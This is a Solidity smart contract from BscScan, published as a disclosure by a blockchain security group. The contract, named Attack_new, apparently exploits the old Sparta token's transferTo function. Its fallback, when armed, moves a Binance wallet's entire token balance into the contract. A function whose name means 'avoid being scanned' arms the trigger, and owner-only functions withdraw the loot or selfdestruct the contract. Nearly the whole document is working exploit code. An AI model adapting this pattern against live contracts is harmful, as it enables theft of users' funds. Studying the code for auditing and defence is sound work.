/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

// StarlitLab Vun Test -- starlitlab.eth
// Since Binance fixed the vulnerability in 0x7be79817a73dd43fe72db8a85b4247dc736739ee1b66e8dee7238a43e64423a3. We will publish the verification code.
// Author: jingqi师傅  & Enoch师傅 twitter:@enoch_eth
// StarlitLab 与您携手共建区块链安全

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface Sparta {
    function transferTo(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address, uint) external returns (bool);
}

contract Attack_new{
    address private old_sparta = 0xE4Ae305ebE1AbE663f261Bc00534067C80ad677C;
    address private binance_wallet = 0x8894E0a0c962CB723c1976a4421c95949bE2D4E3;
    address public owner;
    uint x = 1;

    constructor () {
        owner = msg.sender;
    }

    function withdraw_jinqi(address _to) public {
        require(msg.sender == owner, "not owner");
        Sparta(old_sparta).transfer(_to, Sparta(old_sparta).balanceOf(address(this)));
    }

    function fangzhibeisaomiaochulai(uint num) public {
        require(msg.sender == owner, "not owner");
        x = num;
    }

    fallback() external payable{
        if (x == 0) {
            Sparta(old_sparta).transferTo(address(this), Sparta(old_sparta).balanceOf(binance_wallet));    
        }
    }


    function withdraw_eth(address _to) public {
        require(msg.sender == owner, "not owner");
        selfdestruct(payable(_to));
    }
}